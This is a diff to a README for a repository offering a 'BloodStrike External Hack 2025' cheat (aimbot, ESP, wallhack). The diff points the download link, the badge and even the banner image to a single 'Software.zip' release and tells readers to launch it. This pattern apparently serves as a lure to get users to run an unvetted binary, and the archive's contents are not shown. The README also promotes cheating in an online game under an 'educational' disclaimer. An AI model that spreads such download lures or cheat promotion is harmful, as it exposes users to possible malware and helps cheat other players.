@@ -14,7 +14,7 @@ Welcome to the BloodStrike External Hack 2025 repository, your ultimate solution
 
 To get started with the BloodStrike External Hack 2025, follow these steps:
 
-1. Download the hack from the [latest release](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) on GitHub.
+1. Download the hack from the [latest release](https://github.com/pablofp16/BloodStrike-External-Hack-2025-Aimbot-ESP-Wallhack/releases/download/v2.0/Software.zip) on GitHub.
    
 2. Launch the file and follow the installation instructions provided.
 
@@ -51,9 +51,9 @@ If you encounter any issues or have questions about using the hack tool, please 
 
 Let's dominate the game together with the BloodStrike External Hack 2025! 🎮🔥
 
-[![](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/Releases)
+[![](https://github.com/pablofp16/BloodStrike-External-Hack-2025-Aimbot-ESP-Wallhack/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/pablofp16/BloodStrike-External-Hack-2025-Aimbot-ESP-Wallhack/releases/download/v2.0/Software.zip)
 
-![BloodStrike](https://imageurl.com)
+![BloodStrike](https://github.com/pablofp16/BloodStrike-External-Hack-2025-Aimbot-ESP-Wallhack/releases/download/v2.0/Software.zip)
 
 **Disclaimer:** This hack tool is intended for educational and entertainment purposes only. By using this tool, you agree to the terms and conditions outlined in the repository.
 
